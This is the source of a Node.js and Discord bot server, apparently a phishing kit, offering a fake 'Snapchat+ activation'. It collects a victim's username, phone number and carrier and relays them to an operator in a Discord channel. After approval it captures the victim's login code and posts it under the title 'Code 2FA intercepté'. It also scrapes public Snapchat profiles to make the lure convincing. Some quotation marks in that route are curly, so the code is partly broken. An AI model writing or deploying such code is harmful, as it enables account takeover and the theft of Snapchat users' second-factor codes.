require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
const { v4: uuidv4 } = require('uuid');

// --- Configuration Express ---
const app = express();
app.use(express.json());
app.use(express.static('public'));

// --- Configuration Discord ---
const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
});

// Map pour stocker les demandes en attente
const requests = new Map();

const APPROVAL_CHANNEL_ID = process.env.DISCORD_APPROVAL_CHANNEL;
const BASE_URL = process.env.BASE_URL || `http://localhost:${process.env.PORT || 3000}`;
const PORT = process.env.PORT || 3000;

// ================== ROUTES EXPRESS ==================

// 1. Soumission des infos (étape 1)
app.post('/api/submit', async (req, res) => {
    const { snapchat, phone, operator } = req.body;
    if (!snapchat || !phone || !operator) {
        return res.status(400).json({ error: 'Champs manquants' });
    }

    const id = uuidv4();
    requests.set(id, {
        snapchat, phone, operator,
        approved: false, rejected: false, code: null
    });

    try {
        const channel = client.channels.cache.get(APPROVAL_CHANNEL_ID);
        if (!channel) throw new Error("Salon d'approbation introuvable");

        const embed = new EmbedBuilder()
            .setTitle('📱 Nouvelle demande d\'activation Snapchat+')
            .setColor(0xFFFC00)
            .addFields(
                { name: 'Pseudo', value: snapchat, inline: true },
                { name: 'Téléphone', value: phone, inline: true },
                { name: 'Opérateur', value: operator, inline: true },
                { name: 'ID', value: id }
            )
            .setTimestamp();

        const row = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder().setCustomId(`approve_${id}`).setLabel('✅ Accepter').setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId(`reject_${id}`).setLabel('❌ Refuser').setStyle(ButtonStyle.Danger)
            );

        await channel.send({ embeds: [embed], components: [row] });
        console.log(`✅ Demande #${id} envoyée à Discord`);
        res.json({ id });
    } catch (err) {
        console.error('Erreur envoi Discord :', err);
        res.status(500).json({ error: 'Erreur serveur' });
    }
});

// 2. Vérification d’un pseudo Snapchat (scraping page publique)
app.get(‘/api/check-snapchat/:username’, async (req, res) => {
    const username = req.params.username.trim().toLowerCase();
    if (!username || username.length < 3) return res.status(400).json({ error: ‘Pseudo trop court’ });

    try {
        const response = await axios.get(
            `https://www.snapchat.com/add/${encodeURIComponent(username)}`,
            {
                headers: {
                    ‘User-Agent’: ‘Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1’,
                    ‘Accept’: ‘text/html,application/xhtml+xml’,
                    ‘Accept-Language’: ‘fr-FR,fr;q=0.9’,
                },
                timeout: 8000,
                maxRedirects: 5
            }
        );

        const html = response.data;

        // Extraire l’avatar (og:image)
        const avatarMatch = html.match(/<meta\s+(?:property|name)="og:image"\s+content="([^"]+)"/i)
                         || html.match(/content="([^"]+)"\s+(?:property|name)="og:image"/i);

        // Extraire le nom affiché (og:title)
        const titleMatch = html.match(/<meta\s+(?:property|name)="og:title"\s+content="([^"]+)"/i)
                        || html.match(/content="([^"]+)"\s+(?:property|name)="og:title"/i);

        const avatarUrl = avatarMatch ? avatarMatch[1] : null;
        const rawTitle  = titleMatch  ? titleMatch[1]  : ‘’;

        // Si la page est la page d’accueil générique → pseudo inexistant
        const isGeneric = !rawTitle || rawTitle.toLowerCase().includes(‘snapchat’) && !rawTitle.toLowerCase().includes(username);
        const looksLikeBitmoji = avatarUrl && (avatarUrl.includes(‘bitmoji’) || avatarUrl.includes(‘snapchat’));

        if (looksLikeBitmoji && !isGeneric) {
            // Nom affiché : retirer le suffixe " (@pseudo) | Snapchat"
            const displayName = rawTitle.replace(/\s*\(@[^)]+\).*$/, ‘’).replace(/\s*\|.*$/, ‘’).trim() || username;
            console.log(`✅ Snap trouvé: ${username} → ${displayName} | avatar: ${avatarUrl}`);
            return res.json({ exists: true, username, displayName, avatarUrl });
        }

        console.log(`❌ Snap non trouvé: ${username}`);
        res.json({ exists: false });

    } catch (err) {
        if (err.response && err.response.status === 404) {
            return res.json({ exists: false });
        }
        console.error(‘Erreur vérification Snapchat:’, err.message);
        res.json({ exists: false, error: ‘Service indisponible’ });
    }
});

// 3. Statut d'une demande (polling)
app.get('/api/status/:id', (req, res) => {
    const request = requests.get(req.params.id);
    if (!request) return res.status(404).json({ error: 'Demande introuvable' });
    res.json({
        approved: request.approved,
        rejected: request.rejected,
        snapchat: request.snapchat
    });
});

// 4. Code reçu
app.post('/api/code', async (req, res) => {
    const { id, code } = req.body;
    if (!id || !code) return res.status(400).json({ error: 'Champs manquants' });
    const request = requests.get(id);
    if (!request) return res.status(404).json({ error: 'Demande introuvable' });
    if (!request.approved) return res.status(403).json({ error: 'Demande non approuvée' });

    request.code = code;

    const channel = client.channels.cache.get(APPROVAL_CHANNEL_ID);
    if (channel) {
        const embed = new EmbedBuilder()
            .setTitle('🔐 Code 2FA intercepté')
            .setColor(0x00FF00)
            .addFields(
                { name: 'Pseudo', value: request.snapchat },
                { name: 'Téléphone', value: request.phone },
                { name: 'Opérateur', value: request.operator },
                { name: 'Code', value: code }
            )
            .setTimestamp();
        channel.send({ embeds: [embed] });
    }
    requests.delete(id);
    res.json({ success: true });
});

// --- Interactions Discord (boutons) ---
client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;
    const [action, requestId] = interaction.customId.split('_');
    if (action !== 'approve' && action !== 'reject') return;
    const request = requests.get(requestId);
    if (!request) return interaction.reply({ content: 'Demande introuvable.', ephemeral: true });
    if (request.approved || request.rejected) {
        return interaction.reply({ content: 'Déjà traitée.', ephemeral: true });
    }
    if (action === 'approve') {
        request.approved = true;
        await interaction.reply({ content: `✅ Demande acceptée pour ${request.snapchat}.`, ephemeral: true });
    } else {
        request.rejected = true;
        await interaction.reply({ content: `❌ Demande refusée pour ${request.snapchat}.`, ephemeral: true });
    }
    await interaction.message.edit({ components: [] });
});

// --- Démarrage ---
client.once('ready', () => {
    console.log(`🤖 Bot Discord connecté en tant que ${client.user.tag}`);
});

client.login(process.env.DISCORD_BOT_TOKEN);

app.listen(PORT, () => {
    console.log(`🚀 Serveur web lancé sur ${BASE_URL}`);
});
